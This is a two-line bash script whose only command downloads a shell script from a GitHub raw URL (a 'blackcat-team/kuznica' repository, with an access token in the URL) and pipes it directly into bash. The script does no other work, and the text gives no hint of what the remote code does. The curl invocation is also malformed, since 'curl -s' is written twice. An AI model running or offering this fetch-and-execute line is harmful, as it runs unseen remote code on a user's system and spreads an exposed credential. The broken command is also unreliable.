#!/bin/bash
curl -s curl -s https://raw.githubusercontent.com/blackcat-team/kuznica/refs/heads/main/kuznicamain.sh?token=GHSAT0AAAAAACX3FUE5EA46W452JUQSENWSZXRCOOA | bash
